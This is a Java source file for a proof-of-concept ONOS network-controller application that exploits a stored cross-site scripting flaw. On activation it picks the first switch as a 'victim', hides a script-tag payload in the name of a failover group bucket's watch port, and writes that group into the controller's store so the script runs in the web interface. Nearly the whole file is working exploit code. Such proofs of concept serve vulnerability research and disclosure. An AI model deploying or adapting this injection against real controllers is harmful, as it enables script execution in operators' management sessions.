/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.onosproject.xssgroup;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.group.GroupStore;
import org.onosproject.net.group.GroupDescription;
import org.onosproject.net.group.GroupDescription.Type;
import org.onosproject.net.group.GroupBuckets;
import org.onosproject.net.group.GroupBucket;
import org.onosproject.net.group.DefaultGroup;
import org.onosproject.net.group.DefaultGroupBucket;
import org.onosproject.core.GroupId;
import org.onosproject.net.Device;
import org.onosproject.net.DeviceId;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.TrafficTreatment;
import org.onosproject.net.flow.DefaultTrafficTreatment;
import org.onosproject.net.PortNumber;
import java.util.ArrayList;
import java.util.List;

/**
 * XSS group POC application
 */
@Component(immediate = true)
public class XssGroup {

    private final Logger log = LoggerFactory.getLogger(getClass());

    private final String PAYLOAD = "\"<script>alert(\'maremma bucaiola\')</script>";

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected GroupStore groupStore;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.xssgroup.app", () -> log.info("Periscope down."));
        injectXss();
        log.info("Started xssgroup App!");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Stopped xssgroup App!");
    }

    private void injectXss() {
        Iterable<Device> devices = deviceService.getDevices();
        DeviceId s1 = devices.iterator().next().id();
        log.info("xssgroup App: Victim Switch {}", s1);
        TrafficTreatment treatment = DefaultTrafficTreatment.emptyTreatment();
        PortNumber watchPort = PortNumber.portNumber(1337, PAYLOAD);
        GroupId watchGroup = new GroupId(1);
        GroupBucket bucket = DefaultGroupBucket.createFailoverGroupBucket(treatment, watchPort, watchGroup);
        log.info("xssgroup App: Crafted Bucket Payload {}", bucket.watchPort().toString());
        List<GroupBucket> buckets = new ArrayList<GroupBucket>();
        buckets.add(bucket);
        GroupBuckets gb = new GroupBuckets(buckets);
        log.info("xssgroup App: Crafted Buckets Payload {}", buckets);
        DefaultGroup dg = new DefaultGroup(watchGroup, s1, GroupDescription.Type.FAILOVER, gb);
        groupStore.addOrUpdateGroupEntry(dg);
        log.info("xssgroup App: Payload Injected!", buckets);
    }
}
